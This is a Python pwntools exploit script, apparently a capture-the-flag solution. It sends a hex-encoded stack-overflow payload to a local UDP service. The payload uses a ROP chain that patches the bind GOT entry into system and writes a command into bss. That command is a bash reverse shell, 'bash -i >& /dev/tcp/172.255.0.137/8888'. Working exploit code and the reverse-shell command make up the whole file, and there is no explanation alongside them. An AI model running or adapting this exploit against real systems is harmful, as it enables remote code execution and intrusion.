from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

cmd = b'bash -c "bash -i >& /dev/tcp/172.255.0.137/8888 0>&1"\0\0\0'  # ip and port
# print(len(cmd))
# exit()
cmdsplit = [cmd[i:i+4] for i in range(0, len(cmd), 4)]

r = remote("localhost", 31337, typ="udp")

# pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
reg_set_gadget = 0x0000000000400cca
# add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
addr_write_gadget = 0x0000000000400938
ret_gadget = 0x400766
pop_rdi_gadget = 0x400cd3

bind_got_addr = 0x602078
offset_system = 0xfff298c0  # system-bind
bind_plt_addr = 0x400840

cmd_addr = 0x602610  # bss

rop_chain = [ret_gadget] * 2 + [
    reg_set_gadget,
    offset_system,
    bind_got_addr+0x3d,
    0,
    0,
    0,
    0,
    addr_write_gadget,
    ret_gadget
]

for i in range(len(cmdsplit)):
    rop_chain += [
        reg_set_gadget,
        u32(cmdsplit[i]),
        cmd_addr+0x3d+i*4,
        0,
        0,
        0,
        0,
        addr_write_gadget
    ]

rop_chain += [
    pop_rdi_gadget,
    cmd_addr,
    bind_plt_addr
]
rop_bytes = b''.join([p64(i) for i in rop_chain])
payload = b'\x00'*0x10c+b'\x2e'
payload = payload.ljust(0x118, b'\x00')+rop_bytes
payload = payload.hex()
payload += 'qq'

with open('unhex-payload.bin', 'w') as f:
    f.write(payload)

# print(payload)
# r.send(payload.encode())
# r.interactive()
